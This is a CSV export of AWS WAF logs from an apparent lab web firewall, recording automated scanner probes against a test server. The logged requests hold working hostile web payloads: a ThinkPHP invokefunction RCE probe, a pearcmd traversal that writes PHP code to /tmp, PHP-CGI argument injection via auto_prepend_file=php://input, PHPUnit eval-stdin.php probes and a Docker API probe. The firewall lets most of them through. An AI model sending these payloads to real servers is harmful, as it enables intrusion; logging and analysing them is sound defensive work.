timestamp,message
1770516488211,"{""timestamp"":1770516488211,""formatVersion"":1,""webaclId"":""arn:aws:wafv2:us-east-1:866340886126:regional/webacl/lab-1c-waf/43c037ab-1d2d-41f6-8fc3-86102fcaba82"",""terminatingRuleId"":""Default_Action"",""terminatingRuleType"":""REGULAR"",""action"":""ALLOW"",""terminatingRuleMatchDetails"":[],""httpSourceName"":""ALB"",""httpSourceId"":""866340886126-app/lab-1c-alb/a5b51afb91f57e5c"",""ruleGroupList"":[{""ruleGroupId"":""AWS#AWSManagedRulesCommonRuleSet"",""terminatingRule"":null,""nonTerminatingMatchingRules"":[],""excludedRules"":null,""customerConfig"":null}],""rateBasedRuleList"":[],""nonTerminatingMatchingRules"":[],""requestHeadersInserted"":null,""responseCodeSent"":null,""httpRequest"":{""clientIp"":""107.174.26.3"",""country"":""US"",""headers"":[{""name"":""Host"",""value"":""44.221.71.64""},{""name"":""Upgrade-Insecure-Requests"",""value"":""1""},{""name"":""Accept"",""value"":""*/*""},{""name"":""User-Agent"",""value"":""libredtail-http""},{""name"":""Connection"",""value"":""keep-alive""}],""uri"":""/public/index.php"",""args"":""s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello"",""httpVersion"":""HTTP/1.1"",""httpMethod"":""GET"",""requestId"":""1-6987f008-7745b96824fef9a117b3ccf3"",""fragment"":"""",""scheme"":""https"",""host"":""44.221.71.64""},""ja3Fingerprint"":""7041540a5e44ce9a1d4200c4214355aa"",""ja4Fingerprint"":""t13i170900_5b57614c22b0_78e6aca7449b""}"
1770516488727,"{""timestamp"":1770516488727,""formatVersion"":1,""webaclId"":""arn:aws:wafv2:us-east-1:866340886126:regional/webacl/lab-1c-waf/43c037ab-1d2d-41f6-8fc3-86102fcaba82"",""terminatingRuleId"":""AWSManagedCommonRules"",""terminatingRuleType"":""MANAGED_RULE_GROUP"",""action"":""BLOCK"",""terminatingRuleMatchDetails"":[{""conditionType"":""REGEX"",""location"":""ALL_QUERY_ARGS"",""matchedData"":null,""matchedFieldName"":""""}],""httpSourceName"":""ALB"",""httpSourceId"":""866340886126-app/lab-1c-alb/a5b51afb91f57e5c"",""ruleGroupList"":[{""ruleGroupId"":""AWS#AWSManagedRulesCommonRuleSet"",""terminatingRule"":{""ruleId"":""GenericLFI_QUERYARGUMENTS"",""action"":""BLOCK"",""ruleMatchDetails"":null},""nonTerminatingMatchingRules"":[],""excludedRules"":null,""customerConfig"":null}],""rateBasedRuleList"":[],""nonTerminatingMatchingRules"":[],""requestHeadersInserted"":null,""responseCodeSent"":null,""httpRequest"":{""clientIp"":""107.174.26.3"",""country"":""US"",""headers"":[{""name"":""Host"",""value"":""44.221.71.64""},{""name"":""Upgrade-Insecure-Requests"",""value"":""1""},{""name"":""Accept"",""value"":""*/*""},{""name"":""User-Agent"",""value"":""libredtail-http""},{""name"":""Connection"",""value"":""keep-alive""}],""uri"":""/index.php"",""args"":""lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\""hi\""));?>+/tmp/index1.php"",""httpVersion"":""HTTP/1.1"",""httpMethod"":""GET"",""requestId"":""1-6987f008-318d28723e35ae7e6c71abbf"",""fragment"":"""",""scheme"":""https"",""host"":""44.221.71.64""},""labels"":[{""name"":""awswaf:managed:aws:core-rule-set:GenericLFI_QueryArguments""}],""ja3Fingerprint"":""7041540a5e44ce9a1d4200c4214355aa"",""ja4Fingerprint"":""t13i170900_5b57614c22b0_78e6aca7449b""}"
1770516489199,"{""timestamp"":1770516489199,""formatVersion"":1,""webaclId"":""arn:aws:wafv2:us-east-1:866340886126:regional/webacl/lab-1c-waf/43c037ab-1d2d-41f6-8fc3-86102fcaba82"",""terminatingRuleId"":""AWSManagedCommonRules"",""terminatingRuleType"":""MANAGED_RULE_GROUP"",""action"":""BLOCK"",""terminatingRuleMatchDetails"":[{""conditionType"":""REGEX"",""location"":""ALL_QUERY_ARGS"",""matchedData"":null,""matchedFieldName"":""""}],""httpSourceName"":""ALB"",""httpSourceId"":""866340886126-app/lab-1c-alb/a5b51afb91f57e5c"",""ruleGroupList"":[{""ruleGroupId"":""AWS#AWSManagedRulesCommonRuleSet"",""terminatingRule"":{""ruleId"":""GenericLFI_QUERYARGUMENTS"",""action"":""BLOCK"",""ruleMatchDetails"":null},""nonTerminatingMatchingRules"":[],""excludedRules"":null,""customerConfig"":null}],""rateBasedRuleList"":[],""nonTerminatingMatchingRules"":[],""requestHeadersInserted"":null,""responseCodeSent"":null,""httpRequest"":{""clientIp"":""107.174.26.3"",""country"":""US"",""headers"":[{""name"":""Host"",""value"":""44.221.71.64""},{""name"":""Upgrade-Insecure-Requests"",""value"":""1""},{""name"":""Accept"",""value"":""*/*""},{""name"":""User-Agent"",""value"":""libredtail-http""},{""name"":""Connection"",""value"":""keep-alive""}],""uri"":""/index.php"",""args"":""lang=../../../../../../../../tmp/index1"",""httpVersion"":""HTTP/1.1"",""httpMethod"":""GET"",""requestId"":""1-6987f009-17f2ddbb58ad80533a6eafc2"",""fragment"":"""",""scheme"":""https"",""host"":""44.221.71.64""},""labels"":[{""name"":""awswaf:managed:aws:core-rule-set:GenericLFI_QueryArguments""}],""ja3Fingerprint"":""7041540a5e44ce9a1d4200c4214355aa"",""ja4Fingerprint"":""t13i170900_5b57614c22b0_78e6aca7449b""}"
1770516489780,"{""timestamp"":1770516489780,""formatVersion"":1,""webaclId"":""arn:aws:wafv2:us-east-1:866340886126:regional/webacl/lab-1c-waf/43c037ab-1d2d-41f6-8fc3-86102fcaba82"",""terminatingRuleId"":""Default_Action"",""terminatingRuleType"":""REGULAR"",""action"":""ALLOW"",""terminatingRuleMatchDetails"":[],""httpSourceName"":""ALB"",""httpSourceId"":""866340886126-app/lab-1c-alb/a5b51afb91f57e5c"",""ruleGroupList"":[{""ruleGroupId"":""AWS#AWSManagedRulesCommonRuleSet"",""terminatingRule"":null,""nonTerminatingMatchingRules"":[],""excludedRules"":null,""customerConfig"":null}],""rateBasedRuleList"":[],""nonTerminatingMatchingRules"":[],""requestHeadersInserted"":null,""responseCodeSent"":null,""httpRequest"":{""clientIp"":""107.174.26.3"",""country"":""US"",""headers"":[{""name"":""Host"",""value"":""44.221.71.64""},{""name"":""Upgrade-Insecure-Requests"",""value"":""1""},{""name"":""Accept"",""value"":""*/*""},{""name"":""User-Agent"",""value"":""libredtail-http""},{""name"":""Connection"",""value"":""keep-alive""}],""uri"":""/containers/json"",""args"":"""",""httpVersion"":""HTTP/1.1"",""httpMethod"":""GET"",""requestId"":""1-6987f009-308f783a129e395678f8424b"",""fragment"":"""",""scheme"":""https"",""host"":""44.221.71.64""},""ja3Fingerprint"":""7041540a5e44ce9a1d4200c4214355aa"",""ja4Fingerprint"":""t13i170900_5b57614c22b0_78e6aca7449b""}"
1770517296160,"{""timestamp"":1770517296160,""formatVersion"":1,""webaclId"":""arn:aws:wafv2:us-east-1:866340886126:regional/webacl/lab-1c-waf/43c037ab-1d2d-41f6-8fc3-86102fcaba82"",""terminatingRuleId"":""Default_Action"",""terminatingRuleType"":""REGULAR"",""action"":""ALLOW"",""terminatingRuleMatchDetails"":[],""httpSourceName"":""ALB"",""httpSourceId"":""866340886126-app/lab-1c-alb/a5b51afb91f57e5c"",""ruleGroupList"":[{""ruleGroupId"":""AWS#AWSManagedRulesCommonRuleSet"",""terminatingRule"":null,""nonTerminatingMatchingRules"":[],""excludedRules"":null,""customerConfig"":null}],""rateBasedRuleList"":[],""nonTerminatingMatchingRules"":[],""requestHeadersInserted"":null,""responseCodeSent"":null,""httpRequest"":{""clientIp"":""45.194.90.45"",""country"":""IN"",""headers"":[{""name"":""Host"",""value"":""44.221.71.64""},{""name"":""Upgrade-Insecure-Requests"",""value"":""1""},{""name"":""Accept"",""value"":""*/*""},{""name"":""User-Agent"",""value"":""libredtail-http""},{""name"":""Connection"",""value"":""keep-alive""},{""name"":""Content-Type"",""value"":""application/x-www-form-urlencoded""},{""name"":""Content-Length"",""value"":""241""}],""uri"":""/hello.world"",""args"":""%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"",""httpVersion"":""HTTP/1.1"",""httpMethod"":""POST"",""requestId"":""1-6987f330-4a8fc8c103a04619377a1c95"",""fragment"":"""",""scheme"":""https"",""host"":""44.221.71.64""},""requestBodySize"":241,""requestBodySizeInspectedByWAF"":241,""ja3Fingerprint"":""7041540a5e44ce9a1d4200c4214355aa"",""ja4Fingerprint"":""t13i170900_5b57614c22b0_78e6aca7449b""}"
1770517296439,"{""timestamp"":1770517296439,""formatVersion"":1,""webaclId"":""arn:aws:wafv2:us-east-1:866340886126:regional/webacl/lab-1c-waf/43c037ab-1d2d-41f6-8fc3-86102fcaba82"",""terminatingRuleId"":""Default_Action"",""terminatingRuleType"":""REGULAR"",""action"":""ALLOW"",""terminatingRuleMatchDetails"":[],""httpSourceName"":""ALB"",""httpSourceId"":""866340886126-app/lab-1c-alb/a5b51afb91f57e5c"",""ruleGroupList"":[{""ruleGroupId"":""AWS#AWSManagedRulesCommonRuleSet"",""terminatingRule"":null,""nonTerminatingMatchingRules"":[],""excludedRules"":null,""customerConfig"":null}],""rateBasedRuleList"":[],""nonTerminatingMatchingRules"":[],""requestHeadersInserted"":null,""responseCodeSent"":null,""httpRequest"":{""clientIp"":""45.194.90.45"",""country"":""IN"",""headers"":[{""name"":""Host"",""value"":""44.221.71.64""},{""name"":""Upgrade-Insecure-Requests"",""value"":""1""},{""name"":""Accept"",""value"":""*/*""},{""name"":""User-Agent"",""value"":""libredtail-http""},{""name"":""Connection"",""value"":""keep-alive""},{""name"":""Content-Type"",""value"":""application/x-www-form-urlencoded""},{""name"":""Content-Length"",""value"":""241""}],""uri"":""/"",""args"":""%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"",""httpVersion"":""HTTP/1.1"",""httpMethod"":""POST"",""requestId"":""1-6987f330-702b92c910b42f7153ce2293"",""fragment"":"""",""scheme"":""https"",""host"":""44.221.71.64""},""requestBodySize"":241,""requestBodySizeInspectedByWAF"":241,""ja3Fingerprint"":""7041540a5e44ce9a1d4200c4214355aa"",""ja4Fingerprint"":""t13i170900_5b57614c22b0_78e6aca7449b""}"
1770517296714,"{""timestamp"":1770517296714,""formatVersion"":1,""webaclId"":""arn:aws:wafv2:us-east-1:866340886126:regional/webacl/lab-1c-waf/43c037ab-1d2d-41f6-8fc3-86102fcaba82"",""terminatingRuleId"":""Default_Action"",""terminatingRuleType"":""REGULAR"",""action"":""ALLOW"",""terminatingRuleMatchDetails"":[],""httpSourceName"":""ALB"",""httpSourceId"":""866340886126-app/lab-1c-alb/a5b51afb91f57e5c"",""ruleGroupList"":[{""ruleGroupId"":""AWS#AWSManagedRulesCommonRuleSet"",""terminatingRule"":null,""nonTerminatingMatchingRules"":[],""excludedRules"":null,""customerConfig"":null}],""rateBasedRuleList"":[],""nonTerminatingMatchingRules"":[],""requestHeadersInserted"":null,""responseCodeSent"":null,""httpRequest"":{""clientIp"":""45.194.90.45"",""country"":""IN"",""headers"":[{""name"":""Host"",""value"":""44.221.71.64""},{""name"":""Upgrade-Insecure-Requests"",""value"":""1""},{""name"":""Accept"",""value"":""*/*""},{""name"":""User-Agent"",""value"":""libredtail-http""},{""name"":""Connection"",""value"":""keep-alive""},{""name"":""Content-Type"",""value"":""text/plain""},{""name"":""Content-Length"",""value"":""33""}],""uri"":""/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"",""args"":"""",""httpVersion"":""HTTP/1.1"",""httpMethod"":""GET"",""requestId"":""1-6987f330-694b7d022ae2a0b34dabd457"",""fragment"":"""",""scheme"":""https"",""host"":""44.221.71.64""},""requestBodySize"":33,""requestBodySizeInspectedByWAF"":33,""ja3Fingerprint"":""7041540a5e44ce9a1d4200c4214355aa"",""ja4Fingerprint"":""t13i170900_5b57614c22b0_78e6aca7449b""}"
1770517297522,"{""timestamp"":1770517297522,""formatVersion"":1,""webaclId"":""arn:aws:wafv2:us-east-1:866340886126:regional/webacl/lab-1c-waf/43c037ab-1d2d-41f6-8fc3-86102fcaba82"",""terminatingRuleId"":""Default_Action"",""terminatingRuleType"":""REGULAR"",""action"":""ALLOW"",""terminatingRuleMatchDetails"":[],""httpSourceName"":""ALB"",""httpSourceId"":""866340886126-app/lab-1c-alb/a5b51afb91f57e5c"",""ruleGroupList"":[{""ruleGroupId"":""AWS#AWSManagedRulesCommonRuleSet"",""terminatingRule"":null,""nonTerminatingMatchingRules"":[],""excludedRules"":null,""customerConfig"":null}],""rateBasedRuleList"":[],""nonTerminatingMatchingRules"":[],""requestHeadersInserted"":null,""responseCodeSent"":null,""httpRequest"":{""clientIp"":""45.194.90.45"",""country"":""IN"",""headers"":[{""name"":""Host"",""value"":""44.221.71.64""},{""name"":""Upgrade-Insecure-Requests"",""value"":""1""},{""name"":""Accept"",""value"":""*/*""},{""name"":""User-Agent"",""value"":""libredtail-http""},{""name"":""Connection"",""value"":""keep-alive""},{""name"":""Content-Type"",""value"":""text/plain""},{""name"":""Content-Length"",""value"":""33""}],""uri"":""/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php"",""args"":"""",""httpVersion"":""HTTP/1.1"",""httpMethod"":""GET"",""requestId"":""1-6987f331-7f941b3e64dded4b272ea7d6"",""fragment"":"""",""scheme"":""https"",""host"":""44.221.71.64""},""requestBodySize"":33,""requestBodySizeInspectedByWAF"":33,""ja3Fingerprint"":""7041540a5e44ce9a1d4200c4214355aa"",""ja4Fingerprint"":""t13i170900_5b57614c22b0_78e6aca7449b""}"
1770517298334,"{""timestamp"":1770517298334,""formatVersion"":1,""webaclId"":""arn:aws:wafv2:us-east-1:866340886126:regional/webacl/lab-1c-waf/43c037ab-1d2d-41f6-8fc3-86102fcaba82"",""terminatingRuleId"":""Default_Action"",""terminatingRuleType"":""REGULAR"",""action"":""ALLOW"",""terminatingRuleMatchDetails"":[],""httpSourceName"":""ALB"",""httpSourceId"":""866340886126-app/lab-1c-alb/a5b51afb91f57e5c"",""ruleGroupList"":[{""ruleGroupId"":""AWS#AWSManagedRulesCommonRuleSet"",""terminatingRule"":null,""nonTerminatingMatchingRules"":[],""excludedRules"":null,""customerConfig"":null}],""rateBasedRuleList"":[],""nonTerminatingMatchingRules"":[],""requestHeadersInserted"":null,""responseCodeSent"":null,""httpRequest"":{""clientIp"":""45.194.90.45"",""country"":""IN"",""headers"":[{""name"":""Host"",""value"":""44.221.71.64""},{""name"":""Upgrade-Insecure-Requests"",""value"":""1""},{""name"":""Accept"",""value"":""*/*""},{""name"":""User-Agent"",""value"":""libredtail-http""},{""name"":""Connection"",""value"":""keep-alive""},{""name"":""Content-Type"",""value"":""text/plain""},{""name"":""Content-Length"",""value"":""33""}],""uri"":""/vendor/phpunit/src/Util/PHP/eval-stdin.php"",""args"":"""",""httpVersion"":""HTTP/1.1"",""httpMethod"":""GET"",""requestId"":""1-6987f332-1f68651331457547764e5c2c"",""fragment"":"""",""scheme"":""https"",""host"":""44.221.71.64""},""requestBodySize"":33,""requestBodySizeInspectedByWAF"":33,""ja3Fingerprint"":""7041540a5e44ce9a1d4200c4214355aa"",""ja4Fingerprint"":""t13i170900_5b57614c22b0_78e6aca7449b""}"
1770517299221,"{""timestamp"":1770517299221,""formatVersion"":1,""webaclId"":""arn:aws:wafv2:us-east-1:866340886126:regional/webacl/lab-1c-waf/43c037ab-1d2d-41f6-8fc3-86102fcaba82"",""terminatingRuleId"":""Default_Action"",""terminatingRuleType"":""REGULAR"",""action"":""ALLOW"",""terminatingRuleMatchDetails"":[],""httpSourceName"":""ALB"",""httpSourceId"":""866340886126-app/lab-1c-alb/a5b51afb91f57e5c"",""ruleGroupList"":[{""ruleGroupId"":""AWS#AWSManagedRulesCommonRuleSet"",""terminatingRule"":null,""nonTerminatingMatchingRules"":[],""excludedRules"":null,""customerConfig"":null}],""rateBasedRuleList"":[],""nonTerminatingMatchingRules"":[],""requestHeadersInserted"":null,""responseCodeSent"":null,""httpRequest"":{""clientIp"":""45.194.90.45"",""country"":""IN"",""headers"":[{""name"":""Host"",""value"":""44.221.71.64""},{""name"":""Upgrade-Insecure-Requests"",""value"":""1""},{""name"":""Accept"",""value"":""*/*""},{""name"":""User-Agent"",""value"":""libredtail-http""},{""name"":""Connection"",""value"":""keep-alive""},{""name"":""Content-Type"",""value"":""text/plain""},{""name"":""Content-Length"",""value"":""33""}],""uri"":""/vendor/phpunit/Util/PHP/eval-stdin.php"",""args"":"""",""httpVersion"":""HTTP/1.1"",""httpMethod"":""GET"",""requestId"":""1-6987f333-3927a8282e62384a1f45f803"",""fragment"":"""",""scheme"":""https"",""host"":""44.221.71.64""},""requestBodySize"":33,""requestBodySizeInspectedByWAF"":33,""ja3Fingerprint"":""7041540a5e44ce9a1d4200c4214355aa"",""ja4Fingerprint"":""t13i170900_5b57614c22b0_78e6aca7449b""}"
1770517300091,"{""timestamp"":1770517300091,""formatVersion"":1,""webaclId"":""arn:aws:wafv2:us-east-1:866340886126:regional/webacl/lab-1c-waf/43c037ab-1d2d-41f6-8fc3-86102fcaba82"",""terminatingRuleId"":""Default_Action"",""terminatingRuleType"":""REGULAR"",""action"":""ALLOW"",""terminatingRuleMatchDetails"":[],""httpSourceName"":""ALB"",""httpSourceId"":""866340886126-app/lab-1c-alb/a5b51afb91f57e5c"",""ruleGroupList"":[{""ruleGroupId"":""AWS#AWSManagedRulesCommonRuleSet"",""terminatingRule"":null,""nonTerminatingMatchingRules"":[],""excludedRules"":null,""customerConfig"":null}],""rateBasedRuleList"":[],""nonTerminatingMatchingRules"":[],""requestHeadersInserted"":null,""responseCodeSent"":null,""httpRequest"":{""clientIp"":""45.194.90.45"",""country"":""IN"",""headers"":[{""name"":""Host"",""value"":""44.221.71.64""},{""name"":""Upgrade-Insecure-Requests"",""value"":""1""},{""name"":""Accept"",""value"":""*/*""},{""name"":""User-Agent"",""value"":""libredtail-http""},{""name"":""Connection"",""value"":""keep-alive""},{""name"":""Content-Type"",""value"":""text/plain""},{""name"":""Content-Length"",""value"":""33""}],""uri"":""/vendor/phpunit/phpunit/LICENSE/eval-stdin.php"",""args"":"""",""httpVersion"":""HTTP/1.1"",""httpMethod"":""GET"",""requestId"":""1-6987f334-119630a4501e690b12a02c96"",""fragment"":"""",""scheme"":""https"",""host"":""44.221.71.64""},""requestBodySize"":33,""requestBodySizeInspectedByWAF"":33,""ja3Fingerprint"":""7041540a5e44ce9a1d4200c4214355aa"",""ja4Fingerprint"":""t13i170900_5b57614c22b0_78e6aca7449b""}"
1770517300943,"{""timestamp"":1770517300943,""formatVersion"":1,""webaclId"":""arn:aws:wafv2:us-east-1:866340886126:regional/webacl/lab-1c-waf/43c037ab-1d2d-41f6-8fc3-86102fcaba82"",""terminatingRuleId"":""Default_Action"",""terminatingRuleType"":""REGULAR"",""action"":""ALLOW"",""terminatingRuleMatchDetails"":[],""httpSourceName"":""ALB"",""httpSourceId"":""866340886126-app/lab-1c-alb/a5b51afb91f57e5c"",""ruleGroupList"":[{""ruleGroupId"":""AWS#AWSManagedRulesCommonRuleSet"",""terminatingRule"":null,""nonTerminatingMatchingRules"":[],""excludedRules"":null,""customerConfig"":null}],""rateBasedRuleList"":[],""nonTerminatingMatchingRules"":[],""requestHeadersInserted"":null,""responseCodeSent"":null,""httpRequest"":{""clientIp"":""45.194.90.45"",""country"":""IN"",""headers"":[{""name"":""Host"",""value"":""44.221.71.64""},{""name"":""Upgrade-Insecure-Requests"",""value"":""1""},{""name"":""Accept"",""value"":""*/*""},{""name"":""User-Agent"",""value"":""libredtail-http""},{""name"":""Connection"",""value"":""keep-alive""},{""name"":""Content-Type"",""value"":""text/plain""},{""name"":""Content-Length"",""value"":""33""}],""uri"":""/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"",""args"":"""",""httpVersion"":""HTTP/1.1"",""httpMethod"":""GET"",""requestId"":""1-6987f334-7c3dd4077e687d2b714491f8"",""fragment"":"""",""scheme"":""https"",""host"":""44.221.71.64""},""requestBodySize"":33,""requestBodySizeInspectedByWAF"":33,""ja3Fingerprint"":""7041540a5e44ce9a1d4200c4214355aa"",""ja4Fingerprint"":""t13i170900_5b57614c22b0_78e6aca7449b""}"
1770517301703,"{""timestamp"":1770517301703,""formatVersion"":1,""webaclId"":""arn:aws:wafv2:us-east-1:866340886126:regional/webacl/lab-1c-waf/43c037ab-1d2d-41f6-8fc3-86102fcaba82"",""terminatingRuleId"":""Default_Action"",""terminatingRuleType"":""REGULAR"",""action"":""ALLOW"",""terminatingRuleMatchDetails"":[],""httpSourceName"":""ALB"",""httpSourceId"":""866340886126-app/lab-1c-alb/a5b51afb91f57e5c"",""ruleGroupList"":[{""ruleGroupId"":""AWS#AWSManagedRulesCommonRuleSet"",""terminatingRule"":null,""nonTerminatingMatchingRules"":[],""excludedRules"":null,""customerConfig"":null}],""rateBasedRuleList"":[],""nonTerminatingMatchingRules"":[],""requestHeadersInserted"":null,""responseCodeSent"":null,""httpRequest"":{""clientIp"":""45.194.90.45"",""country"":""IN"",""headers"":[{""name"":""Host"",""value"":""44.221.71.64""},{""name"":""Upgrade-Insecure-Requests"",""value"":""1""},{""name"":""Accept"",""value"":""*/*""},{""name"":""User-Agent"",""value"":""libredtail-http""},{""name"":""Connection"",""value"":""keep-alive""},{""name"":""Content-Type"",""value"":""text/plain""},{""name"":""Content-Length"",""value"":""33""}],""uri"":""/phpunit/phpunit/src/Util/PHP/eval-stdin.php"",""args"":"""",""httpVersion"":""HTTP/1.1"",""httpMethod"":""GET"",""requestId"":""1-6987f335-552f32867583b1860b49e05e"",""fragment"":"""",""scheme"":""https"",""host"":""44.221.71.64""},""requestBodySize"":33,""requestBodySizeInspectedByWAF"":33,""ja3Fingerprint"":""7041540a5e44ce9a1d4200c4214355aa"",""ja4Fingerprint"":""t13i170900_5b57614c22b0_78e6aca7449b""}"
1770517302648,"{""timestamp"":1770517302648,""formatVersion"":1,""webaclId"":""arn:aws:wafv2:us-east-1:866340886126:regional/webacl/lab-1c-waf/43c037ab-1d2d-41f6-8fc3-86102fcaba82"",""terminatingRuleId"":""Default_Action"",""terminatingRuleType"":""REGULAR"",""action"":""ALLOW"",""terminatingRuleMatchDetails"":[],""httpSourceName"":""ALB"",""httpSourceId"":""866340886126-app/lab-1c-alb/a5b51afb91f57e5c"",""ruleGroupList"":[{""ruleGroupId"":""AWS#AWSManagedRulesCommonRuleSet"",""terminatingRule"":null,""nonTerminatingMatchingRules"":[],""excludedRules"":null,""customerConfig"":null}],""rateBasedRuleList"":[],""nonTerminatingMatchingRules"":[],""requestHeadersInserted"":null,""responseCodeSent"":null,""httpRequest"":{""clientIp"":""45.194.90.45"",""country"":""IN"",""headers"":[{""name"":""Host"",""value"":""44.221.71.64""},{""name"":""Upgrade-Insecure-Requests"",""value"":""1""},{""name"":""Accept"",""value"":""*/*""},{""name"":""User-Agent"",""value"":""libredtail-http""},{""name"":""Connection"",""value"":""keep-alive""},{""name"":""Content-Type"",""value"":""text/plain""},{""name"":""Content-Length"",""value"":""33""}],""uri"":""/phpunit/phpunit/Util/PHP/eval-stdin.php"",""args"":"""",""httpVersion"":""HTTP/1.1"",""httpMethod"":""GET"",""requestId"":""1-6987f336-43cdef51265c957856a21875"",""fragment"":"""",""scheme"":""https"",""host"":""44.221.71.64""},""requestBodySize"":33,""requestBodySizeInspectedByWAF"":33,""ja3Fingerprint"":""7041540a5e44ce9a1d4200c4214355aa"",""ja4Fingerprint"":""t13i170900_5b57614c22b0_78e6aca7449b""}"
1770517303530,"{""timestamp"":1770517303530,""formatVersion"":1,""webaclId"":""arn:aws:wafv2:us-east-1:866340886126:regional/webacl/lab-1c-waf/43c037ab-1d2d-41f6-8fc3-86102fcaba82"",""terminatingRuleId"":""Default_Action"",""terminatingRuleType"":""REGULAR"",""action"":""ALLOW"",""terminatingRuleMatchDetails"":[],""httpSourceName"":""ALB"",""httpSourceId"":""866340886126-app/lab-1c-alb/a5b51afb91f57e5c"",""ruleGroupList"":[{""ruleGroupId"":""AWS#AWSManagedRulesCommonRuleSet"",""terminatingRule"":null,""nonTerminatingMatchingRules"":[],""excludedRules"":null,""customerConfig"":null}],""rateBasedRuleList"":[],""nonTerminatingMatchingRules"":[],""requestHeadersInserted"":null,""responseCodeSent"":null,""httpRequest"":{""clientIp"":""45.194.90.45"",""country"":""IN"",""headers"":[{""name"":""Host"",""value"":""44.221.71.64""},{""name"":""Upgrade-Insecure-Requests"",""value"":""1""},{""name"":""Accept"",""value"":""*/*""},{""name"":""User-Agent"",""value"":""libredtail-http""},{""name"":""Connection"",""value"":""keep-alive""},{""name"":""Content-Type"",""value"":""text/plain""},{""name"":""Content-Length"",""value"":""33""}],""uri"":""/phpunit/src/Util/PHP/eval-stdin.php"",""args"":"""",""httpVersion"":""HTTP/1.1"",""httpMethod"":""GET"",""requestId"":""1-6987f337-7b3a97c2026b45f5192b4d45"",""fragment"":"""",""scheme"":""https"",""host"":""44.221.71.64""},""requestBodySize"":33,""requestBodySizeInspectedByWAF"":33,""ja3Fingerprint"":""7041540a5e44ce9a1d4200c4214355aa"",""ja4Fingerprint"":""t13i170900_5b57614c22b0_78e6aca7449b""}"
1770517304320,"{""timestamp"":1770517304320,""formatVersion"":1,""webaclId"":""arn:aws:wafv2:us-east-1:866340886126:regional/webacl/lab-1c-waf/43c037ab-1d2d-41f6-8fc3-86102fcaba82"",""terminatingRuleId"":""Default_Action"",""terminatingRuleType"":""REGULAR"",""action"":""ALLOW"",""terminatingRuleMatchDetails"":[],""httpSourceName"":""ALB"",""httpSourceId"":""866340886126-app/lab-1c-alb/a5b51afb91f57e5c"",""ruleGroupList"":[{""ruleGroupId"":""AWS#AWSManagedRulesCommonRuleSet"",""terminatingRule"":null,""nonTerminatingMatchingRules"":[],""excludedRules"":null,""customerConfig"":null}],""rateBasedRuleList"":[],""nonTerminatingMatchingRules"":[],""requestHeadersInserted"":null,""responseCodeSent"":null,""httpRequest"":{""clientIp"":""45.194.90.45"",""country"":""IN"",""headers"":[{""name"":""Host"",""value"":""44.221.71.64""},{""name"":""Upgrade-Insecure-Requests"",""value"":""1""},{""name"":""Accept"",""value"":""*/*""},{""name"":""User-Agent"",""value"":""libredtail-http""},{""name"":""Connection"",""value"":""keep-alive""},{""name"":""Content-Type"",""value"":""text/plain""},{""name"":""Content-Length"",""value"":""33""}],""uri"":""/phpunit/Util/PHP/eval-stdin.php"",""args"":"""",""httpVersion"":""HTTP/1.1"",""httpMethod"":""GET"",""requestId"":""1-6987f338-0e8de9283d9308e46053a3ee"",""fragment"":"""",""scheme"":""https"",""host"":""44.221.71.64""},""requestBodySize"":33,""requestBodySizeInspectedByWAF"":33,""ja3Fingerprint"":""7041540a5e44ce9a1d4200c4214355aa"",""ja4Fingerprint"":""t13i170900_5b57614c22b0_78e6aca7449b""}"
